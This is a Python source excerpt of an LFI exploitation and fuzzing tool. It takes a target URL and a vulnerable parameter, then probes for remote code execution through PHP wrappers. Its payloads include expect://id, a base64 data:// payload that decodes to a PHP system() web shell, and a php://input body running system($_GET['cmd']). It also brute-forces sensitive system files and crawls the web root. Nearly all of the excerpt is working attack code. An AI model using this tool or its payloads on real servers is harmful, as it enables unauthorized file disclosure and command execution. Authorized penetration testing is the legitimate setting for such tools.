...
parser.add_argument("url", help="Full URL of LFI-vulnerable page. Example: http://www.example.com/page.php?foo=bar&vulnerable=LFI", type=str)
parser.add_argument("parameter", help="Parameter to be used for LFI fuzzing.", type=str)
parser.add_argument("-c","--crawl", help="Only webcrawl.", action="store_true")
parser.add_argument("-r","--rce", help="Only test for RCE.", action="store_true")
parser.add_argument("-k","--keyfiles", help="Only search for keyfiles.", action="store_true")
args = parser.parse_args()

# Helper function for sending payloads quickly
def sendRequest(queryString, payload, postData=None):

    # Update parameter value with payload
    eqInd = queryString.find("=")
    newString = queryString[:eqInd+1] + payload

    # Update URL and send request
    newUrl = args.url.replace(queryString,newString)
    if postData:
        response = requests.post(newUrl, data=postData)
    else:
        response = requests.get(newUrl)

    return str(response.content)

# Detect LFI method to be used and get null response
def getParamString():

    # Find all instances helper function
    ...
    # Extract vulnerable parameter query string
    paramperSands = list(find_all(args.url, "&"))
    paramperSands.insert(0,0)
    if (args.url.index(args.parameter) < max(paramperSands)):
        pCount = 0
        for i in range(0,len(paramperSands)):
            if args.url.index(args.parameter) < paramperSands[i]:
                pCount = i
        extracted = args.url[paramperSands[pCount-1]+1:paramperSands[pCount]]
    else:
        extracted = args.url[paramperSands[-1]+1:]
    ...
    nullResponse = sendRequest(queryString, '')
    errResponse = sendRequest(queryString,'twopointmadethis')
    postNullResponse = sendRequest(queryString, '', '')
    postErrResponse = sendRequest(queryString, 'twopointmadethis', 'twopointmadethis')
    defaults = [nullResponse,errResponse,postNullResponse,postErrResponse]

    return defaults

# Check for RCE with a few methods
def rceCheck(defaults):
    print(f"{Fore.YELLOW}{Style.BRIGHT}==> Testing parameter {Fore.WHITE}{args.parameter}{Fore.YELLOW}{Style.BRIGHT} for RCE via PHP wrappers...{Style.RESET_ALL}")

    rceResult = False
    rceResponse = None

    # Check expect wrapper
    rceResponse = sendRequest(queryString, 'expect://id')
    if rceResponse not in defaults:
        print(f"{Style.BRIGHT}{Fore.MAGENTA}[~]{Style.RESET_ALL} RCE POSSIBLY DETECTED WITH PAYLOAD expect://id [~]")
        rceResult = True
    if "uid=" in rceResponse and "gid=" in rceResponse and "groups=" in rceResponse:
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] RCE DETECTED WITH PAYLOAD {Fore.WHITE}expect://id{Fore.GREEN}{Style.RESET_ALL}")
    
    # Check data wrapper
    rceResponse = sendRequest(queryString, 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id')
    if rceResponse not in defaults:
        print(f"{Style.BRIGHT}{Fore.MAGENTA}[~]{Style.RESET_ALL} RCE possibly detected with data:// wrapper...")
        rceResult = True
    if "uid=" in rceResponse and "gid=" in rceResponse and "groups=" in rceResponse:
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] RCE DETECTED WITH PAYLOAD {Fore.WHITE}data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id{Fore.GREEN}{Style.RESET_ALL}")

    # Check input wrapper
    rceResponse = sendRequest(queryString, 'php://input&cmd=id','<?php system($_GET["cmd"]); ?>')
    if rceResponse not in defaults:
        print(f"{Style.BRIGHT}{Fore.MAGENTA}[~]{Style.RESET_ALL} RCE possibly detected with php://input wrapper...")
        rceResult = True
    if "uid=" in rceResponse and "gid=" in rceResponse and "groups=" in rceResponse:
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] RCE DETECTED WITH PAYLOAD {Fore.WHITE}php://input&cmd=id{Fore.GREEN}!{Style.RESET_ALL}")

    if not rceResult:
        print(f"{Style.BRIGHT}{Fore.RED}[-] RCE via PHP wrappers not detected :({Style.RESET_ALL}")

    return

# Find key files
def keyFiles(defaults):
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}==> Searching for key system files... {Style.RESET_ALL}")

    for file in keyFileList:
        fileResponse = sendRequest(queryString, file)
        if fileResponse not in defaults:
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] FOUND: {Style.RESET_ALL}{file}")

    return

# Crawl web root
def webCrawl(defaults):
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}==> Crawling system webroot ({Fore.WHITE}/var/www/html/ {Fore.YELLOW}and {Fore.WHITE}../ {Fore.YELLOW}queries) ... {Style.RESET_ALL}")

    for file in crawlList:
        fileResponse = sendRequest(queryString, '/var/www/html/'+file)
        if fileResponse not in defaults:
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] FOUND: {Style.RESET_ALL}{file}")
...
keyFileList = keyFilesRaw.split("\n")
crawlList = crawlRaw.split("\n")
